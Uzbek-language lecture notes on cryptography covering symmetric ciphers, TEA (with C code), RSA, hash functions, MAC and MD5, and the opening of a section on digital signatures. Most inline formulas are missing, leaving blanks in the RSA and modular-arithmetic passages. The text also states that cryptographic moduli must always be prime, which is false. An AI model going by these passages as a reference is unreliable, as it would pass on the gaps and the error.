	•	Ochiq kalitli kriptografik tizimlar haqida ma’lumot bering?
	•	Xesh funksiya nima va uning vazifasini tushuntiring?
	•	Elektron raqamli imzo nima va uning vazifasini ayting?
	•	Kriptografik kalitlarni boshqarish bo‘limining vazifasini tushuntiring?
Nazorat savollari
4.2. Simmetrik va ochiq kalitli shifrlash algoritmlari (Ma’ruza mashg‘uloti)
1. Simmetrik shifrlash algoritmlari. 
2. Ochiq kalitli shifrlash algoritmlari. 
3. Afzalliklari va kamchiliklari. 
4. TEA algoritmi. 
5. RSA algoritmi.
Reja:
1. Simmetrik shifrlash algoritmlari. 
2. Ochiq kalitli shifrlash algoritmlari. 
3. Afzalliklari va kamchiliklari. 
4. TEA algoritmi. 
5. RSA algoritmi.
Reja:

Kriptotizim, simmetrik kalitli, ochiq kalitli, o‘rin almashtirish, modul arifmetikasi amallari, kalitlarni xavfsiz uzatish, gibrid kriptotizim, TEA algoritmi, RSA algoritmi.
Kalit so‘zlar:
Kriptotizim, simmetrik kalitli, ochiq kalitli, o‘rin almashtirish, modul arifmetikasi amallari, kalitlarni xavfsiz uzatish, gibrid kriptotizim, TEA algoritmi, RSA algoritmi.
Kalit so‘zlar:
Kriptotizim (cryptosystem) – ochiq matnni, har biri mos algoritm va kalit orqali aniqlanuvchi, shifrmatnga qaytariluvchan o‘zgartirishlar oilasi.
Kriptografik usullar umumiy xususiyatlari bo‘yicha ikki turga, simmetrik va ochiq kalitliga bo‘linadi. Ular bilan keyingi bo‘limlarda tanishib chiqiladi.
Simmetrik shifrlash algoritmlari
Ma’lumotni shifrlash va rasshifrovkalash uchun yagona kalitdan foydalanuvchi shifrlash – simmetrik kalitli shifrlash usuli (ba’zi adabiyotlarda yagona kalitli, bir kalitli, shaxsiy kalitli shifrlash deb ham yuritiladi) deb aytiladi. 
Misol 1. Faraz qilaylik  ingliz harflaridan iborat alfavit bo‘lsin. Kalit  sifatida esa  alfavitni almashtirish (har bir elementini o‘ngga siljitish) soni qaralsin va   ga teng bo‘lsin. U holda yangi alfavitni  ga tengligini bilish oson. Umumiy holda ikki alfavit quyidagiga teng bo‘ladi:
A
=
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
B
=
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
a
b
c
Shifrlash usuli sifatida esa ochiq matn belgilarini  alfavitdan topib, unga mos shifrmatn belgisini  alfavitdan topish qaralgan bo‘lsin. Agar ochiq matn  ga teng bo‘lsa, u holda shifrmatn  ga tengligini bilish oson. 
Rasshifrovkalashda shifrmatn belgilari  alfavitdan olinib, unga mos ochiq matn belgilari  alfavitdan olinadi. Keltirilgan misolda kalit sifatida ochiq matn belgilari olingan  alfavitdan mos bo‘lgan shifrmatn belgilari olinuvchi  alfavitni hosil qiluvchi o‘ngga siljitishlar soni olingan. 
Umumiy holda ikki tomon o‘rtasida simmetrik kalitli shifrlashdan foydalanib tashkil qilingan aloqa sxemasini quyidagicha tasvirlash mumkin (4.3-rasm). Ko‘rish mumkinki, ma’lumotni shifrlash kalitini Bobga yetkazish uchun xavfsiz aloqa kanali talab qilinmoqda. Bu esa, simmetrik kalitli shifrlarda kalitlarni xavfsiz taqsimlash muammosi mavjudligini ko‘rsatadi.

4.3-rasm. Simmetrik kalitli shifrlashga asoslangan ikki tomon o‘rtasidagi aloqa sxemasi
Simmetrik kalitli shifrlash sxemalari ikkita sinfga: blokli shifrlar va oqimli shifrlarga ajratiladi.
Misol 2. O‘rin almashtirish shifrlari ochiq matn blokidagi belgilarni o‘rnini almashtirishga asoslanadi. Boshqacha aytganda, ochiq matndagi belgilarning tarkibi o‘zgarmas saqlanib, tartibi o‘zgaradi. Bunga ochiq matnni jadvalga ustun bo‘yicha yozib, satr bo‘yicha o‘qib olishni misol keltirish mumkin.
Misol 2.  Ochiq matn: “sodda_o'rin_almashtirish_funksiyasi”
s
i
t
n
o
n
i
k
d
_
r
s
d
a
i
i
a
l
sh
y
_
m
_
a
o‘
a
f
s
r
sh
u
i
Shifr matn: “sitnonikd_rsdaiialshy_m_ao‘afsrshui”.
Ochiq kalitli shifrlash algoritmlari
Ochiq kalitli kriptotizimlarda ma’lumotlarni shifrlash bir kalit bilan amalga oshirilsa (ochiq kalit deb ataladi), uni rasshifrovkalash boshqa bir kalit (shaxsiy kalit deb ataladi) bilan amalga oshiriladi. Shuning uchun, ochiq kalitli kriptotizimlarda simmetrik kriptotizimlarda mavjud bo‘lgan kalitlarni taqsimlash muammosi bartaraf etilgan. Biroq, ochiq kalitli kriptografik tizimlarning ham o‘ziga xos muammolari mavjud.
Ochiq kalitli kriptotizimlarni yaratishda “qopqonli” bir tomonlama funksiyalarga asoslaniladi. Bu o‘rinda “bir tomonlama” iborasining ma’nosi – funksiya bir tomonlama osonlik bilan hisoblanadi. Biroq, ushbu funksiyani teskarisini hisoblash juda ham murakkab (ya’ni, hisoblash mumkin emas). Bu yerda, “qopqonli” deyilishiga asosiy sabab, hujumchi ochiq axborotdan (masalan, ochiq kalit) shaxsiy axborotni (masalan, shaxsiy kalitni) tiklashda foydalana olmaydi. Mazkur bir tomonlama funksiyalarga misol sifatida faktorlash amalini ko‘rsatish mumkin. Ya’ni, tub bo‘lgan ikkita p va q sonlarni generatsiyalash va  ni hisoblash oson. Biroq, N soni yetarlicha katta bo‘lganida uni ikkita tub sonning ko‘paytmasi shaklida ifodalash murakkab vazifa va u yuqori hisoblash imkoniyatini talab etadi. 
Simmetrik kalitli shifrlarda ochiq matn  shifrlansa, shifrmatn  hosil bo‘ladi degan shartli belgilash kiritilgan edi. Ochiq kalitli shifrlash tizimlarida esa xabar  shifrlansa, shifrmatn  hosil bo‘ladi deb shartli belgilash kiritiladi. 
Ochiq kalitli kriptografik tizimlardan foydalanish uchun, B tomon ochiq kalit va unga mos bo‘lgan shaxsiy kalit juftiga ega bo‘lishi talab etiladi.  B tomonning ochiq kaliti kimga ma’lum bo‘lsa, u ma’lumotni shifrlashi mumkin. Shifrlangan xabarni ochish faqat shaxsiy kalit egasi bo‘lgan B tomonga joiz. 
Modul arifmetikasi. Ochiq kalitli kriptotizimlar, asosan modul arifmetikasiga asoslangani bois, dastlab unga to‘xtalib o‘tiladi.
Har  qanday  butun sonni       ga  bo‘lsak, bu songa  tayin  bir  qoldiq to‘g‘ri keladi. Masalan,  bo‘lib, unda qoldiq 1 ga va butun qism 2 ga teng bo‘ladi. Kriptografiyada  sonni  songa bo‘lgandagi qoldiq  ga teng bo‘lsa, u quyidagicha belgilanadi: .  Dasturlash tillarida esa  kabi belgilanadi. 
Quyida qoldiq arifmetikasiga oid bir qancha misollar keltirilgan:
	•	;
	•	;
	•	;
	•	;
	•	;
	•	
Bundan tashqari, ochiq kalitli kriptografiyada sonning modul bo‘yicha teskarisini hisoblash muhim hisoblanadi. Masalan, odatiy matematikada  sonining teskarisi  ga teng bo‘lsa, modul arifmetikasida esa  sonining  modul bo‘yicha teskarisi   ko‘rinishida belgilanadi. Odatiy matematikada sonni uning teskarisiga ko‘paytmasi birga teng bo‘lgani kabi, modul arifmetikasida ham sonning uning teskarisiga moduldagi ko‘paytmasi birga teng bo‘ladi. Ya’ni,  bo‘lsa, u holda  tenglik o‘rinli bo‘ladi. 
Izoh. Kriptografiyada modul sifatida (ya’ni, bo‘luvchi) faqat tub sonlardan foydalanish talab etiladi. Ya’ni,  tenglikdagi  har doim tub bo‘lishi lozim.
Aytaylik, 3 sonining 7 moduldagi teskarisini topish talab etilsin. Ya’ni,  ni topish talab etilsin: . Yuqoridagi tenglik  dan foydalanib,  ning o‘rniga son qo‘yib natijani hisoblash mumkin. Lekin, ushbu jarayon ko‘p vaqt talab etadi (ayniqsa katta sonlarda).
Afzalliklari va kamchiliklari
Simmetrik kriptotizimlardagi muammolar. Simmetrik shifrlash tizimlari ma’lumotni shifrlashda va rasshifrovkalashda aynan bir kalitdan foydalanadi. Bu esa tarmoq bo‘ylab shifrlangan ma’lumotni uzatishdan oldin shifrlash kalitini uzatishni taqozo etadi. Boshqacha aytganda, kalitlarni tomonlar orasida xavfsiz uzatish simmetrik kriptotizimlar oldidagi asosiy muammo sanaladi. 
Bundan tashqari, bir foydalanuvchining, qolganlari bilan ma’lumot almashishida, ularning har biri bilan alohida kalitlarga ega bo‘lishi talab etiladi. Bu esa foydalanuvchiga ko‘p sonli kalitlarni xavfsiz saqlash zaruriyatini keltirib chiqaradi.
Simmetrik shifrlar bilan bajarilgan ixtiyoriy amalni, ochiq kalitli shifrlash algoritmlari bilan ham amalga oshirish mumkin. Masalan, tarmoqda ma’lumotlarni uzatishda va xavfsiz bo‘lmagan muhitda axborot konfidensialligini ta’minlashda simmetrik shifrlash algoritmlarining o‘rniga ochiq kalitli kriptografik tizimlardan foydalanish mumkin. Biroq, jarayon ko‘proq vaqt talab etadi.
Bundan tashqari, simmetrik kriptotizimlar kabi ochiq kalitli kriptotizimlardan ham ma’lumotlarning yaxlitligini ta’minlashda foydalanish mumkin. 
Ochiq kalitli kriptotizimlar simmetrik kriptotizimlarda mavjud kalitni taqsimlash muammosini o‘zida bartaraf etgan. O‘z o‘rnida simmetrik kriptotizimlar ochiq kalitli kriptotizimlarga qaraganda samaradorligi bilan ajralib turadi. Boshqacha aytganda, shifrlash va rasshifrovkalash amallari simmetrik kriptotizimlarda, ochiq kalitli shifrlash algoritmlariga nisbatan, tezroq amalga oshiriladi. 
Har ikkala kriptotizimning afzalliklarini birlashtirish imkoniyati mavjudmi? Ya’ni, ma’lumotni shifrlashda yuqori samaradorlikka ega va kalitlarni taqsimlash muammosi bo‘lmagan kriptotizimni yaratish mumkinmi? Albatta, buning imkoniyati mavjud va bunday tizimlar gibrid kriptotizimlar deb ataladi. Gibrid kriptotizimlarda simmetrik shifrlash algoritmining kaliti ochiq kalitni shifrlash orqali yetkazilsa, ma’lumotlarning o‘zi esa simmetrik shifrlash orqali himoyalanadi. Gibrid kriptotizim sxemasi 4.4-rasmda aks ettirilgan.

4.4-rasm. Gibrid kriptotizim
	TEA algoritmi
TEA (Tiny Encryption Algorithm) - bu 1994-yilda Devid Uiler va Roje Nidham tomonidan ishlab chiqilgan, sodda va ixcham tuzilishga ega blokli simmetrik shifrlash algoritmidir. Algoritmning asosiy g‘oyasi — minimal kod hajmi, tezkor ishlash, kam resurs talab qilish, hamda apparat va dasturiy muhitlarda oson amalga oshirishdir. TEA algoritmida ma’lumotlar 64-bitli bloklarga ajratilgan holda va 128-bitli kalitdan foydalanib shifrlanadi. Shifrlash jarayoni Feistel strukturasiga asoslangan bo‘lib, 32 raund davomida bajariladi.
TEA algoritmining tuzilishi va ishlash prinsipi
1. Ma’lumot bloki
Kiruvchi blok: 64 bit
Ikkiga bo‘linadi: L (chap 32 bit) va R (o‘ng 32 bit)
2. Kalit
128 bitli kalit: K0, K1, K2, K3 (har biri 32 bit)
3. Feistel strukturasi
Har bir raundda chap va o‘ng so‘zlar quyidagi funksiyalar asosida o‘zgaradi:
L = L + ((R << 4) + K0) XOR (R + delta) XOR ((R >> 5) + K1)
R = R + ((L << 4) + K2) XOR (L + delta) XOR ((L >> 5) + K3)
Bu yerda:
Delta konstantasi delta = 0x9E3779B9 ga teng.
Bu qiymat oltin nisbatga asoslangan bo‘lib, kriptotahlilga qarshi himoyani kuchaytiradi.
Ushbu algoritmning mos holdagi shifrlash va deshifrlash funksiyalari quyida keltirilgan (C dasturlash tilida):
void encrypt (uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;
    uint32_t delta=0x9E3779B9;
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];
    for (i=0; i<32; i++) {
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }
    v[0]=v0; v[1]=v1;
}
void decrypt (uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  
    uint32_t delta=0x9E3779B9;
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];
    for (i=0; i<32; i++) {
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }
    v[0]=v0; v[1]=v1;
}
TEA algoritmi sodda, ixcham va tezkor blokli shifrlash algoritmi bo‘lib, kriptografiya tarixida muhim o‘rin egallagan. Uning eng katta afzalligi – amalga oshirishning soddaligi va resurslardan juda kam foydalanishidir. Biroq, TEA algoritmi zamonaviy kriptotahlil usullariga qarshi yetarlicha bardosli emas.
RSA algoritmi
RSA nomi algoritmni yaratuvchilari familiyalarining birinchi harflaridan olingan (Rivest, Shamir va Adleman). RSA algoritmi modul arifmetikasining darajaga ko‘tarish amalidan foydalanishga asoslangan.
RSA algoritmida ochiq va shaxsiy kalitlar juftini generatsiyalash uchun ikkita katta uzunlikdagi  va  sonlari tanlanadi va ularning ko‘paytmasi hisoblanadi: . Shundan so‘ng  bilan o‘zaro tub bo‘lgan,  soni tanlanadi ( funksiya ma’nosi quyida keltirilgan). Shundan so‘ng  modulda  sonining teskarisi hisoblanadi va u  ga teng bo‘ladi. Shundan so‘ng, ikkita tub sonning () ko‘paytmasi  va  shartni qanoatlantiruvchi  va  sonlari mavjud. Shundan so‘ng,  lar esdan chiqariladi (o‘chirib tashlanadi).
Bu yerda,  modul hisoblanib, () ochiq kalit juftini va  maxfiy kalitni tashkil etadi. RSA algoritmida shifrlash va rasshifrovkalash modul bo‘yicha darajaga oshirish asosida bajariladi. RSA algoritmida shifrlash uchun  xabarni son ko‘rinishida ifodalash talab etiladi va  modul bo‘yicha  darajaga ko‘tariladi, ya’ni
.
ni rasshifrovkalash uchun uni  modul bo‘yicha shaxsiy kalit  darajaga ko‘tarish talab etiladi:
.
Boshqacha aytganda, RSA algoritmida xabar ochiq kalit bilan shifrlansa va shaxsiy kalit bilan rasshifrovkalansa,  tenglikning to‘g‘riligini isbotlash zarur.
Aytaylik, RSA algoritmida ma’lumotni shifrlash va rasshifrovkalash amallari tanlab olingan () “katta” sonlar ustida amalga oshirish talab qilinsin. Mazkur holda modul  ga teng bo‘ladi va  ga teng bo‘ladi. U holda shifrlash uchun zarur bo‘lgan daraja e ni () ga teng deb olish mumkin. Sababi, 3 soni  bilan o‘zaro tubdir. Shundan so‘ng, Evklidning kengaytirilgan algoritmi asosida rasshifrovkalash kaliti  aniqlanadi. Ya’ni, . U holda A tomonning ochiq kalit jufti  va shaxsiy kaliti  esa  ga teng bo‘ladi. 
Shundan so‘ng, A tomon o‘zining ochiq kalitini barchaga uzatadi. Biroq, shaxsiy kalitini maxfiy saqlaydi. 
Faraz qilaylik, B tomon A tomonga  ma’lumotni shifrlab yubormoqchi. Buning uchun B tomon A tomonning ochiq kaliti juftini  oladi va shifrmatnni quyidagicha hisoblaydi:

va uni A tomonga yuboradi. 
A tomon  shifrmatnni rasshifrovkalash uchun shaxsiy kalit  dan foydalanadi:

Agar RSA algoritmida kichik tub sonlardan () foydalanilgan taqdirda, hujumchi ochiq bo‘lgan  ni osonlik bilan ikkita tub sonning ko‘paytmasi ko‘rinishida yozishi mumkin. Shundan so‘ng, ochiq kalitning ikkinchi qism  dan foydalangan holda, shaxsiy kalit  ni hisoblay oladi. Shuning uchun RSA algoritmidan amalda foydalanish uchun tanlanuvchi tub sonlar uzunligi kamida 2048 bit bo‘lishi talab etiladi. Bundan tashqari, RSA algoritmini buzish faqat faktorlash muammosiga bog‘liqligi isbotlanmagan.
	Simmetrik shifrlash algoritmlarining ishlash prinsiplarini tushuntiring?
	•	Simmetrik kriptografik shifrlarning afzalliklari va kamchiliklari haqida ayting?
	•	O‘rin almashtirish akslantirishiga oid sodda shifrlash algoritmini tushuntiring?
	•	O‘rniga qo‘yish akslantirishiga oid sodda shifrlash algoritmini tushuntiring?
	•	Ochiq kalitli shifrlash algoritmlarining afzalliklari va kamchiliklarini ayting?
	•	TEA algoritmini tushuntiring?
	•	RSA algoritmini ishlash tartibini tushuntiring?
	•	Modul arifmetikasiga oid bilimlaringizni misollar yordamida ko‘rsating?
Nazorat savollari
	•	Simmetrik shifrlash algoritmlarining ishlash prinsiplarini tushuntiring?
	•	Simmetrik kriptografik shifrlarning afzalliklari va kamchiliklari haqida ayting?
	•	O‘rin almashtirish akslantirishiga oid sodda shifrlash algoritmini tushuntiring?
	•	O‘rniga qo‘yish akslantirishiga oid sodda shifrlash algoritmini tushuntiring?
	•	Ochiq kalitli shifrlash algoritmlarining afzalliklari va kamchiliklarini ayting?
	•	TEA algoritmini tushuntiring?
	•	RSA algoritmini ishlash tartibini tushuntiring?
	•	Modul arifmetikasiga oid bilimlaringizni misollar yordamida ko‘rsating?
Nazorat savollari
4.3. Xesh funksiyalar  (Ma’ruza mashg‘uloti)
1. Xesh funksiyalar. 
2. Ma’lumotlarni yaxlitligini ta’minlashda xesh funksiyalarni ahamiyati. 
3. MD5 xesh funksiyasi.
Reja:
1. Xesh funksiyalar. 
2. Ma’lumotlarni yaxlitligini ta’minlashda xesh funksiyalarni ahamiyati. 
3. MD5 xesh funksiyasi.
Reja:

Xesh funksiya, bir tomonlamalik, kolliziya, xesh qiymat, dayjest, yaxlitlik, MAC tizimlari, parollarni xeshlash.
Kalit so‘zlar:
Xesh funksiya, bir tomonlamalik, kolliziya, xesh qiymat, dayjest, yaxlitlik, MAC tizimlari, parollarni xeshlash.
Kalit so‘zlar:
Xesh funksiyalar
Oldingi mavzuda keltirilgan har ikkala shifrlash algoritmidan (simmetrik va ochiq kalitli) faqat ma’lumotlarning konfidensialligini ta’minlashda foydalanish xususida aytib o‘tildi. Quyida esa ulardan ma’lumotlarning yaxlitligini tekshirishda foydalanish masalasi bilan tanishib o‘tiladi.
Xesh funksiya. Xesh funksiya chekli  alfavitdagi  uzunligi  o‘zgaruvchan  kirish xabarini berilgan, odatda qat’iy uzunlikdagi, so‘zga akslantiruvchi funksiya.
Xesh funksiyalar quyidagi vazifalarni bajarishda qo‘llaniladi:
	•	ma’lumotning yaxlitligini tekshirishda;
	•	parollarni xavfsiz saqlashda;
	•	raqamli imzolarda qo‘llashda;
	•	autentifikatsiya protokollarida ishlatishda.
Xesh funksiya quyidagi xususiyatlarga ega bo‘lishi talab etiladi:
	•	Ixtiyoriy uzunlikdagi matnga qo‘llash mumkin.
	•	Chiqishda tayinlangan uzunlikdagi qiymat shakllanadi.
	•	Berilgan ixtiyoriy  bo‘yicha oson hisoblanadi.
	•	Berilgan ixtiyoriy  bo‘yicha   tenglikdan  ni hisoblab topib bo‘lmaydi (bir tomonlilik xossasi).
	•	Olingan  va  matnlar uchun   bo‘ladi (kolliziyaga bardoshlilik xossasi).
	Quyida sodda xesh funksiyaga Python tilida sodda misol keltirilgan:
function simple_hash_mod26(s):
    h = 0
    for each char c in s:
        h = h + ord(c)
    return h mod 26
Masalan, kiruvchi matn “ABC” ga teng bo‘lsa, (ASCII bo‘yicha 'A' = 65, 'B' = 66, 'C' = 67) orqali 65+66+67=198 ni va bundan mod26 bo‘yicha 198mod26=16 natijani olish mumkin.
Xesh funksiyalarni kalitli va kalitsiz turlari mavjud bo‘lib, birinchi holatda xesh funksiya ikki kirishni kalit va xabarni qabul qilsa, ikkinchi holatda faqat xabarni qabul qiladi. Xesh funksiyalardan chiquvchi natijalar xesh qiymat, dayjest, barmoq izi deb ataladi.
Xesh funksiyalar uchun kolliziya hodisasiga bardoshli bo‘lishi muhim bo‘lib, uning bardoshligini belgilaydi. Kolliziyani yuqoridagi sodda xesh funksiya misolida ko‘rib o‘taylik.
Birinchi xabar, “ABC” bo‘lib uning uchun xesh qiymatni 16 ga teng bo‘lishi yuqorida keltirildi. Ikkinchi xabar sifatida “D” harfini (ASCII bo‘yicha 'D' = 68) olaylik. Mazkur holda ham 198mod26=16 ga teng natija olinadi. Demak, “ABC” va “D” turli matnlar, lekin ikkisi ham sodda xesh funksiyamiz boʻyicha 16 natijasini beradi. Ya’ni, bu ikki xabar kolliziya hosil qiladi: 
simple_hash_mod26(“ABC”)=16=simple_hash_mod26(“D”)
Amalda esa xesh funksiyalardan kolliziyaga bardoshli bo‘lishlari qat’iy talab etiladi.
Ma’lumotlarni yaxlitligini ta’minlashda xesh funksiyalarni ahamiyati
Xesh funksiya yordamida uzatilayotgan ma’lumotlar yaxlitligini tekshirishning sodda ko‘rinishi 4.5-rasmda keltirilgan. Jo‘natuvchi xabarning xesh qiymatini hisoblaydi va uni qabul qiluvchiga xabar bilan birgalikda yuboradi. Qabul qiluvchi dastlab xabarning xesh qiymatini hisoblaydi va qabul qilingan xesh qiymat bilan taqqoslaydi. Agar har ikkala xesh qiymat teng bo‘lsa, ma’lumotning yaxlitligi o‘zgarmagan, aks holda o‘zgargan deb topiladi. Odatda xesh funksiya kirishda ma’lumotdan tashqari hech qanday qiymatni talab etmagani bois, kalitsiz kriptografik funksiyalar deb ham ataladi (kalit talab qiluvchi ma’lumotlarning yaxlitligini ta’minlash usullari ham mavjud).

4.5-rasm. Xesh funksiya asosida ma’lumotlar yaxlitligini tekshirish
Yuqorida keltirilgan usulda xavfsizlik muammosi jiddiy bo‘lgani bois, undan amalda foydalanilmaydi. Ya’ni, hujumchi tomonidan faqat ma’lumot o‘zgartirilgan holda yaxlitlikni tekshirish imkoniyati mavjud. Biroq, hujumchi ma’lumotning xesh qiymatini almashtirish orqali foydalanuvchini osonlik bilan ma’lumot yaxlitligiga ishontirishi mumkin. 
Ushbu muammoni bartaraf etuvchi – kalitli xesh funksiyalar yoki xabarlarni autentifikatsiyalash kodi (message authentication code, MAC) tizimlari mavjud bo‘lib, unga ko‘ra biror maxfiy kalit asosida ma’lumotning xesh qiymati hisoblanadi  (4.6-rasm).

4.6-rasm. MAC tizimi
Xesh funksiyalarining axborot xavfsizligida qo‘llanishining eng muhim yo‘nalishlaridan biri - ma’lumotlarning yaxlitligini ta’minlashdir. Xabarlar, fayllar yoki paketlar uzatilayotganda ularning o‘zgarmaganligini tekshirish uchun jo‘natuvchi tomonidan xesh hisoblanadi va qabul qiluvchi tomonidan qayta hisoblab solishtiriladi. Xesh qiymatlarining mos kelmasligi ma’lumot uzatilish jarayonida buzilganini yoki o‘zgartirilganini bildiradi. Bunday mexanizm elektron pochta, fayl uzatish protokollari, raqamli arxivlash tizimlarida keng qo‘llaniladi.
Xesh funksiyalari raqamli imzo tizimlarida ham alohida ahamiyatga ega. Raqamli imzo yaratishda katta hajmdagi xabar to‘g‘ridan-to‘g‘ri imzolanmaydi, balki avvalo xesh funksiyasi bilan qayta ishlanib, ixcham xesh qiymati olinadi. Shu qiymat ochiq kalitli kriptografiya algoritmlari (RSA, ECDSA va boshqalar) yordamida imzolanadi. Tekshirish jarayonida esa xabar xeshlangan holda imzo bilan solishtiriladi. Xesh funksiyalaridan foydalanish imzo yaratish jarayonining tezligini oshiradi, ma’lumotlarning yaxlitligini kafolatlaydi va butun tizimning samaradorligini ta’minlaydi.
Axborot xavfsizligida parollarni himoyalash masalasi alohida muhim yo‘nalishdir. Parollarni ochiq matnda saqlash xavfli bo‘lgani sababli, barcha zamonaviy operatsion tizimlar va autentifikatsiya tizimlari parollarning faqat xesh qiymatini saqlaydi. Xesh funksiyalari bir tomonlama bo‘lgani uchun xesh orqali asl parolni tiklash amalda imkonsiz. Shuningdek, “salt” qo‘llash - ya’ni parolga tasodifiy qo‘shimcha qiymat qo‘shish - hujumchilarning rainbow-table kabi tayyor jadval asosidagi hujumlarini samarasiz qiladi. Parollarni saqlash uchun maxsus yaratilgan sekin ishlovchi xesh funksiyalari - bcrypt, scrypt va Argon2 - yuqori darajadagi himoya ta’minlaydi.
Xesh funksiyalarining axborot xavfsizligidagi yana bir muhim qo‘llanilishi - xabar autentifikatsiyasi mexanizmlaridir. Xususan, HMAC (Hashed Message Authentication Code) algoritmi xesh funksiyasi va maxfiy kalit asosida xabarni haqiqiyligini tasdiqlovchi kod yaratadi. Bu mexanizm TLS, IPSec, SSH kabi xavfsizlik protokollarida, shuningdek, API xizmatlarida keng qo‘llaniladi. HMAC yordamida xabar o‘zgartirilmaganligi va u ishonchli manbadan yuborilganligi tekshiriladi.
Zamonaviy texnologiyalar, xususan blockchain va kriptovalyuta tizimlari ham xesh funksiyalariga tayangan holda ishlaydi. Blockchain tuzilishida har bir blokning xeshi keyingi blokka ulanadi va shu tariqa butun zanjirning yaxlitligi kafolatlanadi. Bloklardan biri o‘zgartirilsa, uning xeshi o‘zgaradi va bu butun zanjirning buzilishiga olib keladi. Bu tamoyil blockchainning o‘zgarmasligi va xavfsizligining asosiy kafolatlaridan biridir.
Xesh funksiyalari axborot tizimlarida texnik vazifalarni bajarishda ham keng qo‘llaniladi. Masalan, fayllarni deduplikatsiya qilish, ya’ni bir xil fayllarni aniqlab takror nusxalarni olib tashlash, virus signaturalarini aniqlash, fayllarni kataloglash va taqqoslash jarayonlarida xesh qiymatlaridan foydalaniladi. Bu jarayonlar katta hajmdagi ma’lumotlar bilan ishlashda sezilarli darajada samaradorlikni oshiradi.
MD5 xesh funksiyasi
MD5 (Message-Digest Algorithm 5) 1991-yilda Ronald Rivest tomonidan ishlab chiqilgan bo‘lib, o‘z davrida keng qo‘llangan kriptografik xesh funksiyalaridan biri hisoblanadi. MD5 istalgan uzunlikdagi kirish ma’lumotidan 128 bit (16 bayt) uzunlikdagi xesh qiymat ishlab chiqaradi. Xesh natijasi odatda 32 belgili o‘n oltilik (hexadecimal) shaklda ifodalanadi.
Biroq, 2005-yildan boshlab MD5 algoritmida kolliziyalarni topish amaliy jihatdan mumkin ekani isbotlandi va natijada MD5 kriptoxavfsizlik talablariga javob bermaydigan algoritm sifatida baholandi. Shunga qaramay, u o‘quv jarayonlarida, fayl yaxlitligini oddiy solishtirishda va texnik tizimlarda hali ham keng uchraydi.
MD5 algoritmi quyidagi bosqichlarda ishlaydi:
1. Kirish ma’lumotini bloklarga ajratish: Ma’lumot 512 bitli bloklarga bo‘linadi va oxirida maxsus to‘ldirish (padding) qo‘shiladi.
2. Har bir blokni to‘rt asosiy registr(A, B, C, D) bilan qayta ishlash: Ushbu registrlar natijada 128 bitli xeshni shakllantiradi.
3. Boolean funksiyalar, siljitishlar va qo‘shimcha konstantalar yordamida iterativ hisoblash: Har bir blok 64 ta bosqichda qayta ishlanadi.
4. Oxirgi bosqichda to‘plangan qiymatlarning birlashtirilishi: Natija - 128 bitli MD5 xesh qiymati.
MD5 xesh funksiyasining ishlash tamoyilini tushunishda onlayn MD5 kalkulyatorlari juda qulay. Quyidagi misollar orqali MD5 xesh natijasining qanday olinishi amaliy ravishda ko‘rsatiladi. Buning uchun qatorlarni sinab ko‘rishda https://www.md5hashgenerator.com/ manzilidagi va fayllarni sinab ko‘rishda https://md5file.com/calculator manzilidagi onlayn MD5 kalkulyatoridan foydalanish mumkin.
1-misol. Oddiy matnni xeshlash. Xabar “Hello” ga teng bo‘lsin. Unin xesh qiymati esa 8b1a9953c4611296a827abf8c47804d7 ga teng bo‘ladi. Quyidagi ikki xabarni qaralsin. Ular dastlabki harflaridangina farq qilsada, ularning xesh qiymatlari tamoman farqlanadi.
Salom
4be1041e508b1bcadd666d5170a4bfce
salom
7650d3efe9d32071f601e9d148767d26
2-misol. Falyni xeshlash uchun taqdim etilgan onlayn kalkulyator yordamida o‘zingiz operatsion tizimdagi biror fayli olib xeshlang va natijani 128 bit ekanligiga ishonch hosil qiling.
	Xesh funksiya nima va uning asosiy xususiyatlarini ayting?
	•	Xesh funksiyalarga qanday talablar qo‘yiladi?
	•	Xesh funksiyalardagi kolliziya hodisasini sodda misollar orqali tushuntiring?
	•	Xesh funksiyalarning turlarini ayting?
	•	Xesh funksiyalarni axborot xavfsizligini ta’minlashdagi ahamiyatini ayting?
	•	MD5 xesh funksiyasi haqida ma’lumot bering?
Nazorat savollari
	•	Xesh funksiya nima va uning asosiy xususiyatlarini ayting?
	•	Xesh funksiyalarga qanday talablar qo‘yiladi?
	•	Xesh funksiyalardagi kolliziya hodisasini sodda misollar orqali tushuntiring?
	•	Xesh funksiyalarning turlarini ayting?
	•	Xesh funksiyalarni axborot xavfsizligini ta’minlashdagi ahamiyatini ayting?
	•	MD5 xesh funksiyasi haqida ma’lumot bering?
Nazorat savollari
4.4. Ochiq kalitlar infratuzilmasi  (Ma’ruza mashg‘uloti)
1. Elektron raqamli imzo. 
2. Imzo muolajalari: imzo qo‘yish, imzoni tekshirish. 
3. Ochiq kalitlar infrastrukturasi. 
Reja:
1. Elektron raqamli imzo. 
2. Imzo muolajalari: imzo qo‘yish, imzoni tekshirish. 
3. Ochiq kalitlar infrastrukturasi. 
Reja:

Elektron raqamli imzo, imzo qo‘yish, imzoni tekshirish, ochiq kalitlar infratuzilmasi, kalitlarni ro‘yxatga olish markazi, ochiq kalit, shaxiy kalit, raqamli sertifikat.
Kalit so‘zlar:
Elektron raqamli imzo, imzo qo‘yish, imzoni tekshirish, ochiq kalitlar infratuzilmasi, kalitlarni ro‘yxatga olish markazi, ochiq kalit, shaxiy kalit, raqamli sertifikat.
Kalit so‘zlar:
Elektron raqamli imzo
O‘zbekiston Respublikasining Elektron raqamli imzo to‘g‘risidagi qonunida elektron raqamli imzoga quyidagicha ta’rif berilgan:
